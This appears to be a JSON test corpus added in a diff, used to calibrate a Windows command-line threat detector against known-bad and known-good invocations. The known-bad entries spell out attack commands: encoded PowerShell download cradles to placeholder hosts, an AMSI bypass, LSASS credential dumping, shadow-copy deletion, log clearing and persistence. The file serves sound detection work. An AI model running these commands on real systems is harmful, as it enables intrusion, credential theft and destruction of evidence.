@@ -1,0 +1,392 @@
+{
+  "_meta": {
+    "schema": "{known_bad: [{id, command_line, note, expect_verdict}], known_good: [{id, command_line, note, tolerated_flags}]}",
+    "purpose": "Calibration corpus for core.cmdline_analyzer — plan §6. Measures detection on known-bad and, more importantly, the false-positive rate on known-good.",
+    "updated": "2026-08-10",
+    "sources": [
+      "known_bad: public technique patterns documented by MITRE ATT&CK, the LOLBAS project and SigmaHQ rule descriptions. Rewritten by hand — no sample is copied from live malware.",
+      "known_good: ordinary Windows administration, packaging and CI invocations."
+    ],
+    "notes": [
+      "Every host and address uses a documentation range (RFC 5737 198.51.100.0/24 / 203.0.113.0/24, RFC 2606 example.com). Nothing here resolves to real infrastructure.",
+      "`tolerated_flags` marks a benign line that legitimately matches a keyword — a real administrator does run `schtasks /create` and `-ExecutionPolicy Bypass`. These are documented, reviewed exceptions, NOT a licence to explain away every false positive: anything firing outside its tolerated list fails the calibration gate.",
+      "Milestone A's verdict ceiling is Suspicious (MALICIOUS_REQUIRES_CORROBORATION), so expect_verdict never reads Malicious here. Milestone B should revisit this file, not just extend it."
+    ]
+  },
+  "known_bad": [
+    {
+      "id": "encoded_dropper",
+      "command_line": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcALwBhAC4AcABzADEAJwApAA==",
+      "note": "Classic encoded download cradle with the full evasion switch set. Reached Malicious once Milestone B added Sigma corroboration — obfuscation plus a high-severity rule match, per plan §4 rule 1.",
+      "expect_verdict": "Malicious"
+    },
+    {
+      "id": "iex_downloadstring",
+      "command_line": "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')\"",
+      "note": "Fileless cradle, unobfuscated.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "certutil_urlcache",
+      "command_line": "certutil.exe -urlcache -split -f http://198.51.100.9/a.exe C:\\Users\\Public\\a.exe",
+      "note": "Signed Microsoft binary used as a downloader.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "bitsadmin_transfer",
+      "command_line": "bitsadmin /transfer job /download /priority high http://198.51.100.11/p.exe C:\\ProgramData\\p.exe",
+      "note": "BITS abused for file transfer.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "mshta_remote",
+      "command_line": "mshta.exe http://198.51.100.12/payload.hta",
+      "note": "HTML Application host pointed at a remote payload.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "rundll32_javascript",
+      "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write()",
+      "note": "Signed binary running inline script.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "regsvr32_squiblydoo",
+      "command_line": "regsvr32.exe /s /n /u /i:http://198.51.100.13/file.sct scrobj.dll",
+      "note": "Squiblydoo — remote COM scriptlet via a signed binary.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "wmic_process_create",
+      "command_line": "wmic.exe process call create \"powershell -nop -w hidden -c IEX(...)\"",
+      "note": "Process creation detached from the normal parent chain.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "vssadmin_shadow_delete",
+      "command_line": "vssadmin.exe delete shadows /all /quiet",
+      "note": "Ransomware precursor — destroys local restore points.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "bcdedit_recovery_off",
+      "command_line": "bcdedit /set {default} recoveryenabled no",
+      "note": "Prevents Windows repairing itself, paired with shadow deletion.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "wevtutil_clear_log",
+      "command_line": "wevtutil.exe cl Security",
+      "note": "Destroys the record of what happened.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "amsi_bypass",
+      "command_line": "powershell -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"",
+      "note": "Neutralises AMSI. No legitimate use.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "defender_exclusion",
+      "command_line": "powershell -c \"Add-MpPreference -ExclusionPath C:\\Users\\Public\"",
+      "note": "Carves out a directory before dropping into it.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "lsass_minidump",
+      "command_line": "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 624 C:\\ProgramData\\out.dmp full",
+      "note": "Credential dumping via a signed binary.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "local_admin_backdoor",
+      "command_line": "net user svc_backup Passw0rd! /add & net localgroup administrators svc_backup /add",
+      "note": "Durable foothold surviving payload cleanup.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "schtasks_encoded_payload",
+      "command_line": "schtasks /create /sc minute /mo 5 /tn Updater /tr \"powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=\"",
+      "note": "Persistence whose scheduled action is itself an encoded payload.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "service_create_payload",
+      "command_line": "sc create UpdaterSvc binPath= \"C:\\ProgramData\\p.exe\" start= auto",
+      "note": "Service persistence running as SYSTEM.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "run_key_persistence",
+      "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\ProgramData\\p.exe /f",
+      "note": "Execution at every logon.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "fodhelper_uac_bypass",
+      "command_line": "cmd.exe /c fodhelper.exe",
+      "note": "Auto-elevating binary abused to skip the UAC prompt.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "backtick_obfuscated_iex",
+      "command_line": "p`o`w`e`r`s`h`e`l`l -c \"i`e`x((n`e`w-object net.webclient).downloadstring('http://198.51.100.20/a'))\"",
+      "note": "Backtick token-splitting evasion. Also reached Malicious under Milestone B.",
+      "expect_verdict": "Malicious"
+    },
+    {
+      "id": "char_code_obfuscation",
+      "command_line": "powershell -c \"([char]105+[char]101+[char]120) (New-Object Net.WebClient).DownloadString('http://198.51.100.21/a')\"",
+      "note": "Character-code reconstruction of IEX.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "format_operator_obfuscation",
+      "command_line": "powershell -c \"('{1}{0}' -f 'X','IE') (New-Object Net.WebClient).DownloadString('http://198.51.100.22/a')\"",
+      "note": "Format-operator reordering.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "archive_staging",
+      "command_line": "powershell -c \"Compress-Archive -Path C:\\Users\\finance\\Documents\\* -DestinationPath C:\\ProgramData\\x.zip\"",
+      "note": "Bundling user documents — collection staging before exfiltration.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "psexec_remote",
+      "command_line": "psexec.exe \\\\WKS-042 -u DOMAIN\\admin -p Passw0rd cmd.exe /c whoami",
+      "note": "Service-based remote execution.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "wmic_remote_node",
+      "command_line": "wmic.exe /node:203.0.113.44 process call create \"cmd.exe /c whoami\"",
+      "note": "Execution against another host.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "firewall_disable",
+      "command_line": "netsh.exe advfirewall set allprofiles state off",
+      "note": "Opens the host to inbound access.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "history_clear",
+      "command_line": "powershell -c \"Clear-History; Remove-Item (Get-PSReadlineOption).HistorySavePath\"",
+      "note": "Operator erasing their own history.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "hidden_attribute_drop",
+      "command_line": "cmd.exe /c attrib +s +h C:\\ProgramData\\p.exe",
+      "note": "Conceals a dropped file.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "layered_base64",
+      "command_line": "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQBuAGMAIABkAHcAQgBvAEEARwA4AEEAWQBRAEIAdABBAEcAawBBAEkAQQBBAHYAQQBHAEUAQQBiAEEAQgBzAEEAQQA9AD0A",
+      "note": "Two base64 layers — the decoder must iterate to a fixed point.",
+      "expect_verdict": "Suspicious"
+    },
+    {
+      "id": "percent_encoded_command",
+      "command_line": "cmd.exe /c %63%65%72%74%75%74%69%6c%2e%65%78%65 -urlcache -f http://198.51.100.30/a.exe",
+      "note": "Percent-encoded binary name.",
+      "expect_verdict": "Suspicious"
+    }
+  ],
+  "known_good": [
+    {
+      "id": "msi_install",
+      "command_line": "msiexec.exe /i \"C:\\ProgramData\\vendor\\agent.msi\" /qn REBOOT=ReallySuppress",
+      "note": "Silent package install.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "msi_uninstall_guid",
+      "command_line": "msiexec.exe /x {3f2504e0-4f89-11d3-9a0c-0305e82c3301} /qn",
+      "note": "GUID must not read as a high-entropy blob.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "vendor_agent_service",
+      "command_line": "\"C:\\Program Files\\Vendor\\agent.exe\" --service --config \"C:\\ProgramData\\vendor\\agent.cfg\"",
+      "note": "Long-running agent started by the service manager.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "git_clone",
+      "command_line": "git.exe clone --depth 1 https://example.com/org/repo.git C:\\src\\repo",
+      "note": "Developer tooling over HTTPS.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "npm_install",
+      "command_line": "npm.cmd install --no-audit --no-fund --prefix C:\\src\\app",
+      "note": "Package install in CI.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "python_script",
+      "command_line": "python.exe C:\\src\\app\\manage.py migrate --noinput",
+      "note": "Ordinary script execution.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "dotnet_build",
+      "command_line": "dotnet.exe build C:\\src\\app\\App.sln -c Release -o C:\\out",
+      "note": "CI build step.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "robocopy_backup",
+      "command_line": "robocopy.exe D:\\data E:\\backup\\data /MIR /R:2 /W:5 /LOG:E:\\backup\\log.txt",
+      "note": "Nightly backup mirror.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "gpupdate",
+      "command_line": "gpupdate.exe /force",
+      "note": "Group policy refresh.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "ipconfig_all",
+      "command_line": "ipconfig.exe /all",
+      "note": "Helpdesk diagnostic.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "sfc_scan",
+      "command_line": "sfc.exe /scannow",
+      "note": "System file check.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "dism_cleanup",
+      "command_line": "dism.exe /online /cleanup-image /restorehealth",
+      "note": "Servicing operation.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "wusa_update",
+      "command_line": "wusa.exe C:\\ProgramData\\updates\\windows10.0-kb5000000-x64.msu /quiet /norestart",
+      "note": "Patch install.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "schtasks_query",
+      "command_line": "schtasks.exe /query /fo LIST /v",
+      "note": "Read-only task listing — must not read as task creation.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "net_use_mapped_drive",
+      "command_line": "net.exe use Z: \\\\fileserver\\shared /persistent:yes",
+      "note": "Logon script drive mapping. Must not read as `net user`.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "netsh_wlan_profiles",
+      "command_line": "netsh.exe wlan show profiles",
+      "note": "Read-only wireless query — must not read as firewall tampering.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "tasklist",
+      "command_line": "tasklist.exe /svc",
+      "note": "Process listing.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "chrome_launch",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --profile-directory=Default --no-first-run",
+      "note": "Browser launch with switches.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "teams_update",
+      "command_line": "\"C:\\Users\\jdoe\\AppData\\Local\\Microsoft\\Teams\\Update.exe\" --processStart Teams.exe",
+      "note": "Squirrel updater in AppData — a shape that looks alarming but is normal.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "onedrive_setup",
+      "command_line": "C:\\Windows\\SysWOW64\\OneDriveSetup.exe /silent",
+      "note": "Bundled installer.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "java_app",
+      "command_line": "java.exe -Xmx2048m -Dfile.encoding=UTF-8 -jar C:\\app\\service.jar --spring.profiles.active=prod",
+      "note": "JVM service launch with many switches.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "sqlcmd_query",
+      "command_line": "sqlcmd.exe -S localhost -E -d reporting -i C:\\jobs\\nightly.sql -o C:\\jobs\\out.txt",
+      "note": "Scheduled reporting job.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "seven_zip_extract",
+      "command_line": "\"C:\\Program Files\\7-Zip\\7z.exe\" x C:\\downloads\\release.zip -oC:\\out -y",
+      "note": "Extraction, not archive creation.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "powershell_get_service",
+      "command_line": "powershell.exe -Command \"Get-Service -Name Spooler | Select-Object Status,Name\"",
+      "note": "Ordinary read-only PowerShell.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "powershell_signed_script",
+      "command_line": "powershell.exe -File \"C:\\Program Files\\Vendor\\scripts\\healthcheck.ps1\" -Verbose",
+      "note": "Script file execution with no evasion switches.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "certutil_hashfile",
+      "command_line": "certutil.exe -hashfile C:\\downloads\\release.zip SHA256",
+      "note": "certutil is in LOLBAS, but hashing is not the abuse pattern. The binary being dual-use must not be enough on its own.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "wmic_csproduct",
+      "command_line": "wmic.exe csproduct get name,identifyingnumber",
+      "note": "Inventory query — must not read as `process call create`.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "curl_vendor_download",
+      "command_line": "curl.exe -sSL -o C:\\downloads\\tool.zip https://example.com/releases/tool.zip",
+      "note": "Legitimate download by a standard tool.",
+      "tolerated_flags": []
+    },
+    {
+      "id": "sccm_wrapper",
+      "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"C:\\Windows\\ccmcache\\1\\install.ps1\"",
+      "note": "The single most common benign-but-noisy line in any Windows estate. SCCM and Intune wrap nearly every deployment this way.",
+      "tolerated_flags": ["NO_PROFILE", "EXEC_POLICY_BYPASS"]
+    },
+    {
+      "id": "backup_scheduled_task",
+      "command_line": "schtasks.exe /create /tn \"VendorBackup\" /tr \"C:\\Program Files\\Vendor\\backup.exe\" /sc daily /st 02:00 /ru SYSTEM",
+      "note": "Administrators really do create scheduled tasks. Persistence technique and routine administration are the same command.",
+      "tolerated_flags": ["SCHTASKS_CREATE"]
+    },
+    {
+      "id": "backup_compress_archive",
+      "command_line": "powershell.exe -NoProfile -Command \"Compress-Archive -Path C:\\logs\\* -DestinationPath E:\\backup\\logs.zip -Force\"",
+      "note": "Archiving is collection staging and it is also how log rotation works.",
+      "tolerated_flags": ["ARCHIVE_STAGING", "NO_PROFILE"]
+    },
+    {
+      "id": "intune_detection_script",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \"C:\\Program Files\\Vendor\\detect.ps1\"",
+      "note": "Intune detection scripts run hidden by design. Hidden window plus policy bypass is a genuinely ambiguous pair — and SigmaHQ agrees: this line matches 'Suspicious PowerShell WindowStyle Option', a rule whose whole condition it satisfies. That is the rule author's intent, not an extraction artefact, so it is tolerated rather than suppressed.",
+      "tolerated_flags": ["EXEC_POLICY_BYPASS", "HIDDEN_WINDOW", "DETECTION_RULE_MATCH"]
+    }
+  ]
+}
